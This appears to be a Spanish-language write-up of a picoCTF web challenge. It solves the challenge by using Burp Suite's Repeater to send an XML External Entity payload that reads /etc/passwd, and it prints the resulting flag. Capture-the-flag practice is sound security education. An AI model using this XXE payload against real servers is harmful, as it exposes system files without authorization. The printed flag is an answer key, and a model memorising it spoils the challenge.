## Descripción del reto
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:59054/)

## Solución
- Empezando el reto nos manda a esta pagina.
![[Pasted image 20250930222546.png]]

- Lo que sigue después es abrir el BurpSuite y con las extensiones conectarla a la pagina, despues probamos los tres botones `Details` para ver como reacciona.
![[Pasted image 20250930223750.png]]

- Ahora damos click derecho dentro del codigo xml y damos en la opcion `send to Repeater`, en donde en el codigo vamos a cambiar lo que tiene por esto:
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <data><ID>&xxe;</ID></data>
```

- Una vez ingresado, damos en la opcion enviar y eso nos mostrara la bandera.
![[Pasted image 20250930224401.png]]

picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}

## Notas


## Referencia